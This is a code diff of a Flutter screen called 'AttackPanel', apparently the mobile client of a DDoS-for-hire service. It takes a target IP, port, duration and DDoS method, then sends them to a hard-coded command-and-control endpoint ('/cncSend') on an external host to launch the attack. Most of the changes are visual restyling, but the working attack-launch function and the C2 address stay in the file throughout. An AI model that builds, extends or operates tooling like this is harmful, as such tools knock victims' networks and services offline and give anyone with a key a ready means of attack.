@@ -1,8 +1,6 @@
-import 'app_config.dart';
 import 'package:flutter/material.dart';
 import 'package:http/http.dart' as http;
 import 'dart:convert';
-import 'dart:ui';
 
 class AttackPanel extends StatefulWidget {
   final String sessionKey;
@@ -21,18 +19,18 @@ class AttackPanel extends StatefulWidget {
 class _AttackPanelState extends State<AttackPanel> with TickerProviderStateMixin {
   final targetController = TextEditingController();
   final portController = TextEditingController();
-  final String baseUrl = kBaseUrl;
+  final String baseUrl = "http://senzlinodepriv.senzhosting.my.id:10791";
   late AnimationController _controller;
-  late Animation<double> _scaleAnimation;
-  late Animation<Offset> _slideAnimation;
   String selectedDoosId = "";
   double attackDuration = 60;
 
-  static const bloodRed = Color(0xFF040F22);
-  static const darkRed = Color(0xFF020818);
-  static const lightRed = Color(0xFFE040FB);
-  static const deepBlack = Color(0xFF020818);
-  static const cardDark = Color(0xFF040F22);
+  // --- TEMA MERAH GELAP ---
+  final Color primaryDark = const Color(0xFF1A0A0A);
+  final Color primaryWhite = Colors.white;
+  final Color accentRed = const Color(0xFFFF5252);
+  final Color primaryRed = const Color(0xFFC62828);
+  final Color cardDark = const Color(0xFF1A0A0A);
+  final Color borderGlass = const Color(0xFF4A1A1A);
 
   @override
   void initState() {
@@ -41,15 +39,6 @@ class _AttackPanelState extends State<AttackPanel> with TickerProviderStateMixin
       vsync: this,
       duration: const Duration(seconds: 2),
     )..repeat(reverse: true);
-
-    _scaleAnimation = Tween<double>(begin: 0.8, end: 1.0).animate(
-      CurvedAnimation(parent: _controller, curve: Curves.elasticOut),
-    );
-
-    _slideAnimation = Tween<Offset>(
-      begin: const Offset(0, 0.3),
-      end: Offset.zero,
-    ).animate(CurvedAnimation(parent: _controller, curve: Curves.easeOut));
 
     if (widget.listDoos.isNotEmpty) {
       selectedDoosId = widget.listDoos[0]['ddos_id'];
@@ -63,213 +52,52 @@ class _AttackPanelState extends State<AttackPanel> with TickerProviderStateMixin
     final int duration = attackDuration.toInt();
 
     if (target.isEmpty || key.isEmpty) {
-      _showAlert("Invalid Input", "Target IP cannot be empty.");
+      _showAlert("❌ Invalid Input", "Target IP cannot be empty.");
       return;
     }
 
     if (selectedDoosId != "icmp" && (port.isEmpty || int.tryParse(port) == null)) {
-      _showAlert("Invalid Port", "Please input a valid port.");
+      _showAlert("❌ Invalid Port", "Please input a valid port.");
       return;
     }
 
     try {
       final uri = Uri.parse(
-          "$kBaseUrl/cncSend?key=$key&target=$target&ddos=$selectedDoosId&port=${port.isEmpty ? 0 : port}&duration=$duration");
+          "$baseUrl/cncSend?key=$key&target=$target&ddos=$selectedDoosId&port=${port.isEmpty ? 0 : port}&duration=$duration");
       final res = await http.get(uri);
       final data = jsonDecode(res.body);
-      print(data);
 
       if (data["cooldown"] == true) {
         _showAlert("⏳ Cooldown", "Please wait a moment before sending again.");
       } else if (data["valid"] == false) {
-        _showAlert("Invalid Key", "Your session key is invalid. Please log in again.");
+        _showAlert("❌ Invalid Key", "Your session key is invalid. Please log in again.");
       } else if (data["sended"] == false) {
-        _showAlert("Failed", "Failed to send attack. The server may be under maintenance.");
+        _showAlert("⚠️ Failed", "Failed to send attack. The server may be under maintenance.");
       } else {
-        _showAlert("Success", "Attack has been successfully sent to $target.");
+        _showAlert("✅ Success", "Attack has been successfully sent to $target.");
       }
     } catch (_) {
-      _showAlert("Error", "An unexpected error occurred. Please try again.");
+      _showAlert("❌ Error", "An unexpected error occurred. Please try again.");
     }
   }
 
   void _showAlert(String title, String msg) {
     showDialog(
       context: context,
-      builder: (_) => BackdropFilter(
-        filter: ImageFilter.blur(sigmaX: 15, sigmaY: 15),
-        child: AlertDialog(
-          backgroundColor: cardDark,
-          shape: RoundedRectangleBorder(
-            borderRadius: BorderRadius.circular(24),
-            side: BorderSide(color: bloodRed.withOpacity(0.3), width: 1.5),
-          ),
-          title: Text(title, style: TextStyle(fontWeight: FontWeight.bold, color: bloodRed)),
-          content: Text(msg, style: TextStyle(color: Colors.white70)),
-          actions: [
-            TextButton(
-              onPressed: () => Navigator.pop(context),
-              child: Text("OK", style: TextStyle(color: bloodRed)),
-            )
-          ],
+      builder: (_) => AlertDialog(
+        backgroundColor: cardDark,
+        shape: RoundedRectangleBorder(
+          borderRadius: BorderRadius.circular(20),
+          side: BorderSide(color: accentRed),
         ),
-      ),
-    );
-  }
-
-  Widget _buildGlassCard({required Widget child, EdgeInsetsGeometry? padding}) {
-    return Container(
-      margin: const EdgeInsets.symmetric(vertical: 8),
-      padding: padding ?? const EdgeInsets.all(20),
-      decoration: BoxDecoration(
-        gradient: LinearGradient(
-          begin: Alignment.topLeft,
-          end: Alignment.bottomRight,
-          colors: [
-            cardDark,
-            cardDark.withOpacity(0.8),
-          ],
-        ),
-        borderRadius: BorderRadius.circular(20),
-        border: Border.all(
-          color: bloodRed.withOpacity(0.3),
-          width: 1.5,
-        ),
-        boxShadow: [
-          BoxShadow(
-            color: bloodRed.withOpacity(0.15),
-            blurRadius: 25,
-            spreadRadius: 2,
-          ),
+        title: Text(title, style: TextStyle(color: primaryWhite, fontFamily: 'Orbitron')),
+        content: Text(msg, style: TextStyle(color: primaryWhite.withOpacity(0.7), fontFamily: 'ShareTechMono')),
+        actions: [
+          TextButton(
+            onPressed: () => Navigator.pop(context),
+            child: Text("OK", style: TextStyle(color: accentRed)),
+          )
         ],
-      ),
-      child: child,
-    );
-  }
-
-  Widget _buildGlassInputField({
-    required TextEditingController controller,
-    required String label,
-    required IconData icon,
-    TextInputType keyboardType = TextInputType.text,
-    bool enabled = true,
-    String? hintText,
-  }) {
-    return Container(
-      margin: const EdgeInsets.only(bottom: 16),
-      decoration: BoxDecoration(
-        borderRadius: BorderRadius.circular(16),
-        gradient: LinearGradient(
-          colors: [
-            cardDark,
-            cardDark.withOpacity(0.8),
-          ],
-        ),
-      ),
-      child: TextField(
-        controller: controller,
-        keyboardType: keyboardType,
-        enabled: enabled,
-        style: TextStyle(color: enabled ? Colors.white : Colors.white54),
-        cursorColor: bloodRed,
-        decoration: InputDecoration(
-          labelText: label,
-          labelStyle: TextStyle(color: enabled ? Colors.white70 : Colors.white38),
-          hintText: hintText,
-          hintStyle: TextStyle(color: Colors.white54),
-          prefixIcon: Icon(icon, color: enabled ? bloodRed : Colors.white38),
-          filled: false,
-          border: OutlineInputBorder(
-            borderRadius: BorderRadius.circular(16),
-            borderSide: BorderSide(color: bloodRed.withOpacity(0.3)),
-          ),
-          focusedBorder: OutlineInputBorder(
-            borderRadius: BorderRadius.circular(16),
-            borderSide: BorderSide(color: bloodRed, width: 2),
-          ),
-          enabledBorder: OutlineInputBorder(
-            borderRadius: BorderRadius.circular(16),
-            borderSide: BorderSide(color: bloodRed.withOpacity(0.3)),
-          ),
-          disabledBorder: OutlineInputBorder(
-            borderRadius: BorderRadius.circular(16),
-            borderSide: BorderSide(color: bloodRed.withOpacity(0.1)),
-          ),
-          contentPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 16),
-        ),
-      ),
-    );
-  }
-
-  Widget _buildSectionTitle(String title, IconData icon) {
-    return Padding(
-      padding: const EdgeInsets.only(bottom: 16),
-      child: Row(
-        children: [
-          Icon(icon, color: bloodRed, size: 24),
-          const SizedBox(width: 12),
-          Text(
-            title,
-            style: TextStyle(
-              fontSize: 20,
-              fontWeight: FontWeight.bold,
-              color: Colors.white,
-            ),
-          ),
-        ],
-      ),
-    );
-  }
-
-  Widget _buildActionButton({
-    required String text,
-    required IconData icon,
-    required VoidCallback onPressed,
-    required Color color,
-  }) {
-    return Container(
-      decoration: BoxDecoration(
-        borderRadius: BorderRadius.circular(16),
-        gradient: LinearGradient(
-          colors: [
-            color.withOpacity(0.8),
-            color.withOpacity(0.6),
-          ],
-        ),
-        boxShadow: [
-          BoxShadow(
-            color: color.withOpacity(0.3),
-            blurRadius: 15,
-            spreadRadius: 2,
-          ),
-        ],
-      ),
-      child: ElevatedButton(
-        onPressed: onPressed,
-        style: ElevatedButton.styleFrom(
-          backgroundColor: Colors.transparent,
-          shadowColor: Colors.transparent,
-          padding: const EdgeInsets.symmetric(vertical: 16, horizontal: 24),
-          shape: RoundedRectangleBorder(
-            borderRadius: BorderRadius.circular(16),
-          ),
-        ),
-        child: Row(
-          mainAxisAlignment: MainAxisAlignment.center,
-          children: [
-            Icon(icon, color: Colors.white, size: 24),
-            const SizedBox(width: 12),
-            Text(
-              text,
-              style: TextStyle(
-                color: Colors.white,
-                fontWeight: FontWeight.bold,
-                fontSize: 18,
-                letterSpacing: 1.2,
-              ),
-            ),
-          ],
-        ),
       ),
     );
   }
@@ -277,264 +105,209 @@ class _AttackPanelState extends State<AttackPanel> with TickerProviderStateMixin
   @override
   Widget build(BuildContext context) {
     final isIcmp = selectedDoosId.toLowerCase() == "icmp";
-
     return Scaffold(
-      backgroundColor: deepBlack,
-      body: Stack(
-        children: [
-          Positioned(
-            top: -100,
-            right: -100,
-            child: Container(
-              width: 300,
-              height: 300,
-              decoration: BoxDecoration(
-                shape: BoxShape.circle,
-                gradient: RadialGradient(
-                  colors: [
-                    bloodRed.withOpacity(0.1),
-                    Colors.transparent,
-                  ],
+      backgroundColor: primaryDark,
+      appBar: AppBar(
+        backgroundColor: primaryDark,
+        elevation: 0,
+        title: const Text(
+          "🚀 Attack Panel",
+          style: TextStyle(
+            fontFamily: 'Orbitron',
+            fontWeight: FontWeight.bold,
+            color: Colors.white,
+          ),
+        ),
+        centerTitle: true,
+        iconTheme: const IconThemeData(color: Colors.white),
+      ),
+      body: SafeArea(
+        child: SingleChildScrollView(
+          padding: const EdgeInsets.all(20),
+          child: Column(
+            children: [
+              FadeTransition(
+                opacity: Tween(begin: 0.5, end: 1.0).animate(_controller),
+                child: ClipOval(
+                  child: Image.asset(
+                    'assets/images/logo.png',
+                    width: 120,
+                    height: 120,
+                    fit: BoxFit.cover,
+                  ),
                 ),
               ),
-            ),
-          ),
-          Positioned(
-            bottom: -150,
-            left: -100,
-            child: Container(
-              width: 400,
-              height: 400,
-              decoration: BoxDecoration(
-                shape: BoxShape.circle,
-                gradient: RadialGradient(
-                  colors: [
-                    darkRed.withOpacity(0.08),
-                    Colors.transparent,
-                  ],
+              const SizedBox(height: 20),
+              Text(
+                "Target Input & Methods",
+                style: TextStyle(
+                  color: primaryWhite,
+                  fontFamily: 'Orbitron',
+                  fontSize: 18,
+                  fontWeight: FontWeight.bold,
                 ),
               ),
-            ),
-          ),
+              Divider(color: accentRed, thickness: 0.6),
+              const SizedBox(height: 25),
 
-          BackdropFilter(
-            filter: ImageFilter.blur(sigmaX: 20, sigmaY: 20),
-            child: SafeArea(
-              child: SingleChildScrollView(
-                padding: const EdgeInsets.all(16),
+              _buildInputCard(
+                icon: Icons.computer,
+                title: "Target IP",
+                child: TextField(
+                  controller: targetController,
+                  style: TextStyle(color: primaryWhite),
+                  cursorColor: accentRed,
+                  decoration: _inputStyle("Target IP (e.g. 1.1.1.1)"),
+                ),
+              ),
+              const SizedBox(height: 20),
+
+              _buildInputCard(
+                icon: Icons.wifi_tethering,
+                title: "Port",
+                child: TextField(
+                  controller: portController,
+                  enabled: !isIcmp,
+                  keyboardType: TextInputType.number,
+                  style: TextStyle(color: isIcmp ? Colors.grey : primaryWhite),
+                  cursorColor: isIcmp ? Colors.grey : accentRed,
+                  decoration: _inputStyle(
+                    isIcmp ? "ICMP does not use port" : "Port (e.g. 80)",
+                    isIcmp: isIcmp,
+                  ),
+                ),
+              ),
+              const SizedBox(height: 20),
+
+              _buildInputCard(
+                icon: Icons.timer,
+                title: "Attack Duration",
                 child: Column(
+                  crossAxisAlignment: CrossAxisAlignment.start,
                   children: [
-                    SlideTransition(
-                      position: _slideAnimation,
-                      child: _buildGlassCard(
-                        child: Row(
-                          mainAxisAlignment: MainAxisAlignment.center,
-                          children: [
-                            Icon(Icons.rocket_launch, color: bloodRed, size: 32),
-                            const SizedBox(width: 12),
-                            const Text(
-                              "ATTACK PANEL",
-                              style: TextStyle(
-                                fontSize: 24,
-                                fontWeight: FontWeight.bold,
-                                letterSpacing: 1.5,
-                                color: Colors.white,
-                              ),
-                            ),
-                          ],
-                        ),
-                      ),
+                    Text("⏱ ${attackDuration.toInt()} seconds",
+                        style: TextStyle(color: primaryWhite.withOpacity(0.7), fontSize: 14)),
+                    Slider(
+                      value: attackDuration,
+                      min: 10,
+                      max: 300,
+                      divisions: 29,
+                      label: "${attackDuration.toInt()}s",
+                      activeColor: accentRed,
+                      inactiveColor: primaryWhite.withOpacity(0.1),
+                      onChanged: (value) {
+                        setState(() => attackDuration = value);
+                      },
                     ),
-
-                    const SizedBox(height: 24),
-
-                    SlideTransition(
-                      position: _slideAnimation,
-                      child: ScaleTransition(
-                        scale: _scaleAnimation,
-                        child: FadeTransition(
-                          opacity: Tween(begin: 0.6, end: 1.0).animate(_controller),
-                          child: Container(
-                            padding: const EdgeInsets.all(6),
-                            decoration: BoxDecoration(
-                              shape: BoxShape.circle,
-                              gradient: LinearGradient(
-                                colors: [bloodRed.withOpacity(0.4), darkRed.withOpacity(0.4)],
-                                begin: Alignment.topLeft,
-                                end: Alignment.bottomRight,
-                              ),
-                              boxShadow: [
-                                BoxShadow(
-                                  color: bloodRed.withOpacity(0.3),
-                                  blurRadius: 20,
-                                  spreadRadius: 3,
-                                ),
-                              ],
-                            ),
-                            child: ClipOval(
-                              child: Image.asset(
-                                'assets/images/logo.jpg',
-                                width: 100,
-                                height: 100,
-                                fit: BoxFit.cover,
-                              ),
-                            ),
-                          ),
-                        ),
-                      ),
-                    ),
-
-                    const SizedBox(height: 24),
-
-                    SlideTransition(
-                      position: _slideAnimation,
-                      child: _buildGlassCard(
-                        child: Column(
-                          crossAxisAlignment: CrossAxisAlignment.start,
-                          children: [
-                            _buildSectionTitle("Target Input", Icons.computer),
-                            _buildGlassInputField(
-                              controller: targetController,
-                              label: "Target IP",
-                              icon: Icons.computer,
-                              hintText: "e.g. 1.1.1.1",
-                            ),
-                          ],
-                        ),
-                      ),
-                    ),
-
-                    const SizedBox(height: 16),
-
-                    SlideTransition(
-                      position: _slideAnimation,
-                      child: _buildGlassCard(
-                        child: Column(
-                          crossAxisAlignment: CrossAxisAlignment.start,
-                          children: [
-                            _buildSectionTitle("Port Configuration", Icons.wifi_tethering),
-                            _buildGlassInputField(
-                              controller: portController,
-                              label: "Port",
-                              icon: Icons.wifi_tethering,
-                              keyboardType: TextInputType.number,
-                              enabled: !isIcmp,
-                              hintText: isIcmp ? "ICMP does not use port" : "e.g. 80",
-                            ),
-                          ],
-                        ),
-                      ),
-                    ),
-
-                    const SizedBox(height: 16),
-
-                    SlideTransition(
-                      position: _slideAnimation,
-                      child: _buildGlassCard(
-                        child: Column(
-                          crossAxisAlignment: CrossAxisAlignment.start,
-                          children: [
-                            _buildSectionTitle("Attack Duration", Icons.timer),
-                            const SizedBox(height: 16),
-                            Text(
-                              "⏱ ${attackDuration.toInt()} seconds",
-                              style: TextStyle(
-                                color: Colors.white70,
-                                fontSize: 16,
-                                fontWeight: FontWeight.bold,
-                              ),
-                            ),
-                            const SizedBox(height: 12),
-                            Slider(
-                              value: attackDuration,
-                              min: 10,
-                              max: 300,
-                              divisions: 29,
-                              label: "${attackDuration.toInt()}s",
-                              activeColor: bloodRed,
-                              inactiveColor: Colors.white.withOpacity(0.2),
-                              thumbColor: lightRed,
-                              onChanged: (value) {
-                                setState(() => attackDuration = value);
-                              },
-                            ),
-                          ],
-                        ),
-                      ),
-                    ),
-
-                    const SizedBox(height: 16),
-
-                    SlideTransition(
-                      position: _slideAnimation,
-                      child: _buildGlassCard(
-                        child: Column(
-                          crossAxisAlignment: CrossAxisAlignment.start,
-                          children: [
-                            _buildSectionTitle("Attack Method", Icons.flash_on),
-                            const SizedBox(height: 16),
-                            Container(
-                              decoration: BoxDecoration(
-                                borderRadius: BorderRadius.circular(16),
-                                gradient: LinearGradient(
-                                  colors: [
-                                    cardDark,
-                                    cardDark.withOpacity(0.8),
-                                  ],
-                                ),
-                              ),
-                              child: DropdownButtonHideUnderline(
-                                child: DropdownButton<String>(
-                                  dropdownColor: cardDark,
-                                  value: selectedDoosId,
-                                  isExpanded: true,
-                                  iconEnabledColor: bloodRed,
-                                  style: TextStyle(color: Colors.white),
-                                  borderRadius: BorderRadius.circular(16),
-                                  items: widget.listDoos.map((doos) {
-                                    return DropdownMenuItem<String>(
-                                      value: doos['ddos_id'],
-                                      child: Padding(
-                                        padding: const EdgeInsets.symmetric(vertical: 8),
-                                        child: Text(
-                                          doos['ddos_name'],
-                                          style: TextStyle(color: Colors.white),
-                                        ),
-                                      ),
-                                    );
-                                  }).toList(),
-                                  onChanged: (value) {
-                                    setState(() {
-                                      selectedDoosId = value!;
-                                    });
-                                  },
-                                ),
-                              ),
-                            ),
-                          ],
-                        ),
-                      ),
-                    ),
-
-                    const SizedBox(height: 32),
-
-                    SlideTransition(
-                      position: _slideAnimation,
-                      child: _buildActionButton(
-                        text: "LAUNCH ATTACK",
-                        icon: Icons.bolt,
-                        onPressed: _sendDoos,
-                        color: bloodRed,
-                      ),
-                    ),
-
-                    const SizedBox(height: 20),
                   ],
                 ),
               ),
-            ),
+              const SizedBox(height: 20),
+
+              _buildInputCard(
+                icon: Icons.flash_on,
+                title: "Attack Method",
+                child: DropdownButtonHideUnderline(
+                  child: DropdownButton<String>(
+                    dropdownColor: cardDark,
+                    value: selectedDoosId,
+                    isExpanded: true,
+                    iconEnabledColor: accentRed,
+                    style: TextStyle(color: primaryWhite),
+                    items: widget.listDoos.map((doos) {
+                      return DropdownMenuItem<String>(
+                        value: doos['ddos_id'],
+                        child: Text(doos['ddos_name'], style: TextStyle(color: primaryWhite)),
+                      );
+                    }).toList(),
+                    onChanged: (value) {
+                      setState(() {
+                        selectedDoosId = value!;
+                      });
+                    },
+                  ),
+                ),
+              ),
+              const SizedBox(height: 40),
+
+              SizedBox(
+                width: double.infinity,
+                child: ElevatedButton.icon(
+                  onPressed: _sendDoos,
+                  icon: Icon(Icons.bolt, color: primaryWhite),
+                  label: Text(
+                    "LAUNCH ATTACK",
+                    style: TextStyle(
+                      fontSize: 16,
+                      fontFamily: 'Orbitron',
+                      fontWeight: FontWeight.bold,
+                      letterSpacing: 1.2,
+                      color: primaryWhite,
+                    ),
+                  ),
+                  style: ElevatedButton.styleFrom(
+                    backgroundColor: primaryRed,
+                    padding: const EdgeInsets.symmetric(vertical: 14),
+                    shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)),
+                    elevation: 6,
+                    shadowColor: accentRed.withOpacity(0.6),
+                  ),
+                ),
+              ),
+            ],
           ),
+        ),
+      ),
+    );
+  }
+
+  Widget _buildInputCard({required IconData icon, required String title, required Widget child}) {
+    return Container(
+      padding: const EdgeInsets.all(16),
+      decoration: BoxDecoration(
+        color: cardDark,
+        borderRadius: BorderRadius.circular(16),
+        border: Border.all(color: accentRed.withOpacity(0.5), width: 1),
+        boxShadow: [
+          BoxShadow(
+            color: accentRed.withOpacity(0.2),
+            blurRadius: 8,
+            spreadRadius: 1,
+          )
         ],
+      ),
+      child: Column(
+        crossAxisAlignment: CrossAxisAlignment.start,
+        children: [
+          Row(
+            children: [
+              Icon(icon, color: accentRed, size: 20),
+              const SizedBox(width: 8),
+              Text(title,
+                  style: TextStyle(color: primaryWhite, fontWeight: FontWeight.bold)),
+            ],
+          ),
+          const SizedBox(height: 10),
+          child,
+        ],
+      ),
+    );
+  }
+
+  InputDecoration _inputStyle(String hint, {bool isIcmp = false}) {
+    return InputDecoration(
+      hintText: hint,
+      hintStyle: TextStyle(color: isIcmp ? Colors.grey : accentRed),
+      filled: true,
+      fillColor: primaryDark,
+      contentPadding: const EdgeInsets.symmetric(horizontal: 14, vertical: 12),
+      enabledBorder: OutlineInputBorder(
+        borderSide: BorderSide(color: isIcmp ? Colors.grey : accentRed),
+        borderRadius: BorderRadius.circular(16),
+      ),
+      focusedBorder: OutlineInputBorder(
+        borderSide: BorderSide(color: isIcmp ? Colors.grey : accentRed),
+        borderRadius: BorderRadius.circular(16),
       ),
     );
   }
